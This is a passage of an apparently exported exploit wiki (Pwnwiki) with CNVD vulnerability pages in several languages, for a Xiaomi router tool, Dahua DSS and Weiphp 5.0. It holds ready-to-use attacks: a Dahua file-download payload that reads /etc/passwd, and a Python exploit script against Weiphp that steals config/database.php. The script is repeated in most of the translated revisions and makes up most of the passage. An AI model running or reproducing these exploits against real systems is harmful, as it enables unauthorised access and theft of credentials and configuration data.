      <timestamp>2021-07-08T13:49:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt;   ==FOFA== &lt;pre&gt; app="Misstar-Tools-小米路由器" &lt;/pre&gt;   ==POC== &lt;pre&gt; http://&lt;target&gt;:1024/ &lt;/pre&gt;  &lt;translate&gt; 新增FTP賬戶，重啓FTP服務。 &lt;/tran..."</comment>
      <origin>6595</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="181" sha1="9id1ndzofjfcrnbaz5yuwx7klokhexs" xml:space="preserve">&lt;languages /&gt;


==FOFA==
&lt;pre&gt;
app="Misstar-Tools-小米路由器"
&lt;/pre&gt;


==POC==
&lt;pre&gt;
http://&lt;target&gt;:1024/
&lt;/pre&gt;

&lt;translate&gt;
新增FTP賬戶，重啓FTP服務。
&lt;/translate&gt;</text>
      <sha1>9id1ndzofjfcrnbaz5yuwx7klokhexs</sha1>
    </revision>
    <revision>
      <id>6596</id>
      <parentid>6595</parentid>
      <timestamp>2021-07-08T13:51:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6596</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="192" sha1="chqhp2eoj6pbwzkzquvoamtb1ou5xju" xml:space="preserve">&lt;languages /&gt;


==FOFA==
&lt;pre&gt;
app="Misstar-Tools-小米路由器"
&lt;/pre&gt;


==POC==
&lt;pre&gt;
http://&lt;target&gt;:1024/
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:1--&gt;
新增FTP賬戶，重啓FTP服務。
&lt;/translate&gt;</text>
      <sha1>chqhp2eoj6pbwzkzquvoamtb1ou5xju</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-58411 Misstar Tools 小米路由器 未授權訪問漏洞/zh-cn</title>
    <ns>0</ns>
    <id>6146</id>
    <revision>
      <id>7026</id>
      <timestamp>2021-07-12T06:53:20Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "新增FTP账户，重启FTP服务"</comment>
      <origin>7026</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="153" sha1="01x3uk1z984jjbb5o27y0zpi1fp7iz0" xml:space="preserve">&lt;languages /&gt;


==FOFA==
&lt;pre&gt;
app="Misstar-Tools-小米路由器"
&lt;/pre&gt;


==POC==
&lt;pre&gt;
http://&lt;target&gt;:1024/
&lt;/pre&gt;

新增FTP账户，重启FTP服务</text>
      <sha1>01x3uk1z984jjbb5o27y0zpi1fp7iz0</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-61986 大華DSS系統任意文件下載漏洞</title>
    <ns>0</ns>
    <id>4256</id>
    <revision>
      <id>4893</id>
      <timestamp>2021-06-12T12:43:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞簡介==  浙江大華技術股份有限公司DSS存在任意文件下載漏洞，攻擊者可利用該漏洞登錄界面下載任意文件..."</comment>
      <origin>4893</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="311" sha1="c9xt5t5kdrqde61oy6clh17uobs5xow" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞簡介==

浙江大華技術股份有限公司DSS存在任意文件下載漏洞，攻擊者可利用該漏洞登錄界面下載任意文件獲取敏感信息。
&lt;/translate&gt;


==Payload==
&lt;pre&gt;
http://ip/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
&lt;/pre&gt;</text>
      <sha1>c9xt5t5kdrqde61oy6clh17uobs5xow</sha1>
    </revision>
    <revision>
      <id>4894</id>
      <parentid>4893</parentid>
      <timestamp>2021-06-12T12:44:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4894</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="333" sha1="53e66r6rmvk7w71qwae05bzogk0yalk" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞簡介== &lt;!--T:1--&gt;

&lt;!--T:2--&gt;
浙江大華技術股份有限公司DSS存在任意文件下載漏洞，攻擊者可利用該漏洞登錄界面下載任意文件獲取敏感信息。
&lt;/translate&gt;


==Payload==
&lt;pre&gt;
http://ip/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
&lt;/pre&gt;</text>
      <sha1>53e66r6rmvk7w71qwae05bzogk0yalk</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-61986 大華DSS系統任意文件下載漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4263</id>
    <revision>
      <id>4901</id>
      <timestamp>2021-06-12T12:47:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "浙江大华技术股份有限公司DSS存在任意文件下载漏洞，攻击者可利用该漏洞登录界面下载任意文件获取敏感信息。"</comment>
      <origin>4901</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="286" sha1="k5kscpk9npks3vftgaq5zbfp6rs3by4" xml:space="preserve">&lt;languages /&gt;
==漏洞简介==

浙江大华技术股份有限公司DSS存在任意文件下载漏洞，攻击者可利用该漏洞登录界面下载任意文件获取敏感信息。


==Payload==
&lt;pre&gt;
http://ip/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
&lt;/pre&gt;</text>
      <sha1>k5kscpk9npks3vftgaq5zbfp6rs3by4</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-61986 大華DSS系統任意文件下載漏洞/zh-tw</title>
    <ns>0</ns>
    <id>6103</id>
    <revision>
      <id>6973</id>
      <timestamp>2021-07-10T08:35:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CNVD-2020-61986 大華DSS系統任意文件下載漏洞"</comment>
      <origin>6973</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="286" sha1="tn5f4ojfwevr3lmu05myekpqsvsxy0g" xml:space="preserve">&lt;languages /&gt;
==漏洞簡介==

浙江大華技術股份有限公司DSS存在任意文件下載漏洞，攻擊者可利用該漏洞登錄界面下載任意文件獲取敏感信息。


==Payload==
&lt;pre&gt;
http://ip/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
&lt;/pre&gt;</text>
      <sha1>tn5f4ojfwevr3lmu05myekpqsvsxy0g</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-68596 Weiphp5.0 前台文件任意讀取漏洞</title>
    <ns>0</ns>
    <id>902</id>
    <revision>
      <id>1169</id>
      <timestamp>2021-04-08T03:43:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Weiphp &lt;= 5.0 &lt;/pre&gt;  ==POC== &lt;pre&gt; #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from   : http:..."</comment>
      <origin>1169</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3029" sha1="1kxnjblrargcl8qu0wbo3cwhmxjpzuc" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import random
import re


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')                            \033[0m')
    print('+  \033[34mVersion: Weiphp5.0                                                \033[0m')
    print('+  \033[36m使用格式: python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    upload_url = target_url + "/public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=./../config/database.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    data = {
        "1":1
    }
    try:
        response = requests.post(url=upload_url, headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            print("\033[32m[o] 成功将 database.php文件 写入Pictrue表中\033[0m")
        else:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")

def POC_2(target_url):
    vnln_url = target_url + "/public/index.php/home/file/user_pics"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(url=vnln_url, headers=headers).text
        href = re.findall(r'&lt;img src="(.*?)"', response)
        for i in href:
            print("\033[32m[o] 得到敏感文件url：{}\033[0m".format(i))
            data = requests.get(url=i, headers=headers)
            path = str(random.randint(1,999)) + '.php'
            with open(path, 'wb') as f:
                f.write(data.content)
                print("\033[32m[o] 成功下载文件为：{}\033[0m".format(path))
                print("\033[32m[o] 文件内容为：\n\033[0m{}".format(data.text))
    except:
            print("\033[31m[x] 获取文件名失败 \033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
    image_url = POC_2(target_url)
&lt;/pre&gt;
&lt;translate&gt;
==參考==
&lt;/translate&gt;
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html</text>
      <sha1>1kxnjblrargcl8qu0wbo3cwhmxjpzuc</sha1>
    </revision>
    <revision>
      <id>1170</id>
      <parentid>1169</parentid>
      <timestamp>2021-04-08T03:43:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1170</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3051" sha1="6fky7jqaezv7xtl55owt537xofiek98" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import random
import re


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')                            \033[0m')
    print('+  \033[34mVersion: Weiphp5.0                                                \033[0m')
    print('+  \033[36m使用格式: python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    upload_url = target_url + "/public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=./../config/database.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    data = {
        "1":1
    }
    try:
        response = requests.post(url=upload_url, headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            print("\033[32m[o] 成功将 database.php文件 写入Pictrue表中\033[0m")
        else:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")

def POC_2(target_url):
    vnln_url = target_url + "/public/index.php/home/file/user_pics"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(url=vnln_url, headers=headers).text
        href = re.findall(r'&lt;img src="(.*?)"', response)
        for i in href:
            print("\033[32m[o] 得到敏感文件url：{}\033[0m".format(i))
            data = requests.get(url=i, headers=headers)
            path = str(random.randint(1,999)) + '.php'
            with open(path, 'wb') as f:
                f.write(data.content)
                print("\033[32m[o] 成功下载文件为：{}\033[0m".format(path))
                print("\033[32m[o] 文件内容为：\n\033[0m{}".format(data.text))
    except:
            print("\033[31m[x] 获取文件名失败 \033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
    image_url = POC_2(target_url)
&lt;/pre&gt;
&lt;translate&gt;
==參考== &lt;!--T:2--&gt;
&lt;/translate&gt;
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html</text>
      <sha1>6fky7jqaezv7xtl55owt537xofiek98</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-68596 Weiphp5.0 前台文件任意讀取漏洞/en</title>
    <ns>0</ns>
    <id>3222</id>
    <revision>
      <id>3759</id>
      <timestamp>2021-05-31T03:57:31Z</timestamp>
      <contributor>
        <username>Wosk0x01</username>
        <id>272</id>
      </contributor>
      <comment>Created page with "==Impact of the vulnerability=="</comment>
      <origin>3759</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3055" sha1="bfds605ekaz9v1mt92c3vay9nvmw4hr" xml:space="preserve">&lt;languages   /&gt;

==Impact of the vulnerability==
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import random
import re


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')                            \033[0m')
    print('+  \033[34mVersion: Weiphp5.0                                                \033[0m')
    print('+  \033[36m使用格式: python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    upload_url = target_url + "/public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=./../config/database.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    data = {
        "1":1
    }
    try:
        response = requests.post(url=upload_url, headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            print("\033[32m[o] 成功将 database.php文件 写入Pictrue表中\033[0m")
        else:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")

def POC_2(target_url):
    vnln_url = target_url + "/public/index.php/home/file/user_pics"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(url=vnln_url, headers=headers).text
        href = re.findall(r'&lt;img src="(.*?)"', response)
        for i in href:
            print("\033[32m[o] 得到敏感文件url：{}\033[0m".format(i))
            data = requests.get(url=i, headers=headers)
            path = str(random.randint(1,999)) + '.php'
            with open(path, 'wb') as f:
                f.write(data.content)
                print("\033[32m[o] 成功下载文件为：{}\033[0m".format(path))
                print("\033[32m[o] 文件内容为：\n\033[0m{}".format(data.text))
    except:
            print("\033[31m[x] 获取文件名失败 \033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
    image_url = POC_2(target_url)
&lt;/pre&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html</text>
      <sha1>bfds605ekaz9v1mt92c3vay9nvmw4hr</sha1>
    </revision>
    <revision>
      <id>3762</id>
      <parentid>3759</parentid>
      <timestamp>2021-05-31T03:57:54Z</timestamp>
      <contributor>
        <username>Wosk0x01</username>
        <id>272</id>
      </contributor>
      <comment>Created page with "==Reference=="</comment>
      <origin>3762</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2997" sha1="4zzjrz4p1i6lwx3vh3bb8luetpbgx7d" xml:space="preserve">&lt;languages   /&gt;

==Impact of the vulnerability==
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import random
import re


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')                            \033[0m')
    print('+  \033[34mVersion: Weiphp5.0                                                \033[0m')
    print('+  \033[36m使用格式: python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    upload_url = target_url + "/public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=./../config/database.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    data = {
        "1":1
    }
    try:
        response = requests.post(url=upload_url, headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            print("\033[32m[o] 成功将 database.php文件 写入Pictrue表中\033[0m")
        else:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")

def POC_2(target_url):
    vnln_url = target_url + "/public/index.php/home/file/user_pics"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(url=vnln_url, headers=headers).text
        href = re.findall(r'&lt;img src="(.*?)"', response)
        for i in href:
            print("\033[32m[o] 得到敏感文件url：{}\033[0m".format(i))
            data = requests.get(url=i, headers=headers)
            path = str(random.randint(1,999)) + '.php'
            with open(path, 'wb') as f:
                f.write(data.content)
                print("\033[32m[o] 成功下载文件为：{}\033[0m".format(path))
                print("\033[32m[o] 文件内容为：\n\033[0m{}".format(data.text))
    except:
            print("\033[31m[x] 获取文件名失败 \033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
    image_url = POC_2(target_url)
&lt;/pre&gt;
==Reference==
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html</text>
      <sha1>4zzjrz4p1i6lwx3vh3bb8luetpbgx7d</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-68596 Weiphp5.0 前台文件任意讀取漏洞/he</title>
    <ns>0</ns>
    <id>3861</id>
    <revision>
      <id>4472</id>
      <timestamp>2021-06-09T10:30:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== השפעת פגיעות =="</comment>
      <origin>4472</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2998" sha1="akgmvtmcnigf5banx5hww9ldmpmob56" xml:space="preserve">&lt;languages   /&gt;

== השפעת פגיעות ==
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import random
import re


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')                            \033[0m')
    print('+  \033[34mVersion: Weiphp5.0                                                \033[0m')
    print('+  \033[36m使用格式: python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    upload_url = target_url + "/public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=./../config/database.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    data = {
        "1":1
    }
    try:
        response = requests.post(url=upload_url, headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            print("\033[32m[o] 成功将 database.php文件 写入Pictrue表中\033[0m")
        else:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")

def POC_2(target_url):
    vnln_url = target_url + "/public/index.php/home/file/user_pics"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(url=vnln_url, headers=headers).text
        href = re.findall(r'&lt;img src="(.*?)"', response)
        for i in href:
            print("\033[32m[o] 得到敏感文件url：{}\033[0m".format(i))
            data = requests.get(url=i, headers=headers)
            path = str(random.randint(1,999)) + '.php'
            with open(path, 'wb') as f:
                f.write(data.content)
                print("\033[32m[o] 成功下载文件为：{}\033[0m".format(path))
                print("\033[32m[o] 文件内容为：\n\033[0m{}".format(data.text))
    except:
            print("\033[31m[x] 获取文件名失败 \033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
    image_url = POC_2(target_url)
&lt;/pre&gt;
== הפניה ==
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html</text>
      <sha1>akgmvtmcnigf5banx5hww9ldmpmob56</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-68596 Weiphp5.0 前台文件任意讀取漏洞/ru</title>
    <ns>0</ns>
    <id>4471</id>
    <revision>
      <id>5146</id>
      <timestamp>2021-06-16T02:00:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CNVD-2020-68596 Weiphp5.0 Уязвимость при чтении файлов во внешнем интерфейсе произвольно"</comment>
      <origin>5146</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3020" sha1="3slss6fw85xztz0hthbjcgrgsmgef3h" xml:space="preserve">&lt;languages   /&gt;

== Воздействие уязвимости ==
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import random
import re


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')                            \033[0m')
    print('+  \033[34mVersion: Weiphp5.0                                                \033[0m')
    print('+  \033[36m使用格式: python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    upload_url = target_url + "/public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=./../config/database.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    data = {
        "1":1
    }
    try:
        response = requests.post(url=upload_url, headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            print("\033[32m[o] 成功将 database.php文件 写入Pictrue表中\033[0m")
        else:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")

def POC_2(target_url):
    vnln_url = target_url + "/public/index.php/home/file/user_pics"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(url=vnln_url, headers=headers).text
        href = re.findall(r'&lt;img src="(.*?)"', response)
        for i in href:
            print("\033[32m[o] 得到敏感文件url：{}\033[0m".format(i))
            data = requests.get(url=i, headers=headers)
            path = str(random.randint(1,999)) + '.php'
            with open(path, 'wb') as f:
                f.write(data.content)
                print("\033[32m[o] 成功下载文件为：{}\033[0m".format(path))
                print("\033[32m[o] 文件内容为：\n\033[0m{}".format(data.text))
    except:
            print("\033[31m[x] 获取文件名失败 \033[0m")



if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
    image_url = POC_2(target_url)
&lt;/pre&gt;
== Ссылка ==
http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596.html</text>
      <sha1>3slss6fw85xztz0hthbjcgrgsmgef3h</sha1>
    </revision>
  </page>
  <page>
    <title>CNVD-2020-68596 Weiphp5.0 前台文件任意讀取漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3547</id>
    <revision>
      <id>4122</id>
      <timestamp>2021-06-06T09:00:24Z</timestamp>
      <contributor>
        <username>Xl199928</username>
        <id>290</id>
      </contributor>
      <comment>Created page with "==漏洞影响=="</comment>
      <origin>4122</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2979" sha1="rg7qc1xa35zoow5pjueu40pukqltasd" xml:space="preserve">&lt;languages   /&gt;

==漏洞影响==
&lt;pre&gt;
Weiphp &lt;= 5.0
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import random
import re


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                \033[0m')                            \033[0m')
    print('+  \033[34mVersion: Weiphp5.0                                                \033[0m')
    print('+  \033[36m使用格式: python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    upload_url = target_url + "/public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=./../config/database.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    data = {
        "1":1
    }
    try:
        response = requests.post(url=upload_url, headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            print("\033[32m[o] 成功将 database.php文件 写入Pictrue表中\033[0m")
        else:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")

def POC_2(target_url):
    vnln_url = target_url + "/public/index.php/home/file/user_pics"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(url=vnln_url, headers=headers).text
        href = re.findall(r'&lt;img src="(.*?)"', response)
        for i in href:
            print("\033[32m[o] 得到敏感文件url：{}\033[0m".format(i))
            data = requests.get(url=i, headers=headers)
            path = str(random.randint(1,999)) + '.php'
